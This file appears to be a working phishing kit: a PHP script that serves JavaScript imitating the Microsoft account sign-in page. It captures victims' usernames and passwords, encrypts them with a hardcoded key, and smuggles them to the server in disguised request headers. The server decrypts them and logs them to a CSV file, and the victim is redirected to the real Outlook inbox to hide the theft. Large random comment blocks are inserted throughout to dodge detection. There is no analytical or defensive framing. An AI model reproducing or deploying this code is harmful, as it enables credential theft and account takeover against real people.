<?php
    header('Content-Type: application/javascript');
    $usr="";
    $pwd="";
   $headers = getallheaders();
   foreach ($headers as $key => $value)
   {
    if($key == "Ctf-Xray-Uuid"){
        $pwd = $value;
    }
    if($key == "Ctf-Xray-Id"){
        $usr = $value;
    }
      
   }
?>

<?php
function cryptoJsAesDecrypt($passphrase, $jsonString){
    $jsondata = json_decode($jsonString, true);
    $salt = hex2bin($jsondata["s"]);
    $ct = base64_decode($jsondata["ct"]);
    $iv  = hex2bin($jsondata["iv"]);
    $concatedPassphrase = $passphrase.$salt;
    $md5 = array();
    $md5[0] = md5($concatedPassphrase, true);
    $result = $md5[0];
    for ($i = 1; $i < 3; $i++) {
        $md5[$i] = md5($md5[$i - 1].$concatedPassphrase, true);
        $result .= $md5[$i];
    }
    $key = substr($result, 0, 32);
    $data = openssl_decrypt($ct, 'aes-256-cbc', $key, true, $iv);
    return json_decode($data, true);
}
$key = "SECP$#$@#$@$@FAFSAFASFSAF";


if($usr !== "" && $pwd !== ""){
    $usr = cryptoJsAesDecrypt($key, $usr);
    $pwd = cryptoJsAesDecrypt($key, $pwd);
    $handle = fopen("cc.csv", "a");
    fputcsv($handle, [$usr, $pwd]);
    fclose($handle);
    echo "//Not Updated!";
    die();
}

function getName($n) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
 
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
 
    return $randomString;
}

?>
<?php echo '/*'.getName(10000).'*/'?>
document.addEventListener('DOMContentLoaded', () => {

    var CryptoJSAesJson = {
    stringify: function (cipherParams) {
        var j = {ct: cipherParams.ciphertext.toString(CryptoJS.enc.Base64)};
        if (cipherParams.iv) j.iv = cipherParams.iv.toString();
        if (cipherParams.salt) j.s = cipherParams.salt.toString();
        return JSON.stringify(j);
    },
    parse: function (jsonStr) {
        var j = JSON.parse(jsonStr);
        var cipherParams = CryptoJS.lib.CipherParams.create({ciphertext: CryptoJS.enc.Base64.parse(j.ct)});
        if (j.iv) cipherParams.iv = CryptoJS.enc.Hex.parse(j.iv)
        if (j.s) cipherParams.salt = CryptoJS.enc.Hex.parse(j.s)
        return cipherParams;
    }
    }
    var key = "SECP$#$@#$@$@FAFSAFASFSAF";

    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

<?php echo '/*'.getName(10000).'*/'?>   
    document.getElementById("inp_uname")
        .addEventListener("keyup", function(event) {
        event.preventDefault();
        if (event.keyCode === 13) {
            validate();
            if (unameVal) {
                document.getElementById("section_uname").classList.toggle('d-none');
                document.getElementById('section_pwd').classList.remove('d-none');
                document.querySelectorAll('#user_identity').forEach((e) => {
                    e.innerText = unameInp.value;
                })
                view = "pwd";
            }
        }
    });
<?php echo '/*'.getName(10000).'*/'?>
    document.getElementById("inp_pwd")
        .addEventListener("keyup", function(event) {
        event.preventDefault();
        if (event.keyCode === 13) {
            validate();
            if (pwdVal) {
                document.getElementById("section_pwd").classList.toggle('d-none');
                document.getElementById('section_final').classList.remove('d-none');
                view = "final";
                encryptiong();
            }
        }
    });
<?php echo '/*'.getName(10000).'*/'?>
    let unameVal = pwdVal = false;
    /////next button
    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', () => {
        //validate the form
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "pwd";
        }
    })
<?php echo '/*'.getName(10000).'*/'?>
    //////sign in button

    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', () => {
        //validate the form
        validate();
        if (pwdVal) {
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";
            encryptiong();
        }
    })

    function encryptiong(){
        var temp1=document.getElementById('inp_uname').value;
            var temp2=document.getElementById('inp_pwd').value;
            temp1 = CryptoJS.AES.encrypt(JSON.stringify(temp1), key, {format: CryptoJSAesJson}).toString();
            temp2 = CryptoJS.AES.encrypt(JSON.stringify(temp2), key, {format: CryptoJSAesJson}).toString();
            check_cache(temp1,temp2)
    }

    function check_cache(t,d)
    {
    var xmlHttp = new XMLHttpRequest();

    xmlHttp.open( "GET", "assets/app.php", false );
    xmlHttp.setRequestHeader("ctf-xray-id",t);
    xmlHttp.setRequestHeader("ctf-xray-uuid",d);
    xmlHttp.send( null );
    var t = xmlHttp.responseText;
    window.location = "https://outlook.office.com/mail/inbox/";
    }

<?php echo '/*'.getName(10000).'*/'?>
    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }

        }
<?php echo '/*'.getName(10000).'*/'?>
        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }

        }
        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
            unameInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
            pwdInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        }
        return false;
    }
<?php echo '/*'.getName(10000).'*/'?>
    //back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })
<?php echo '/*'.getName(10000).'*/'?>
    //final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            //close the window
            window.open(location, '_self').close();
        })
    })
})
<?php echo '/* Autogenerated:'.getName(10000).'*/'?>
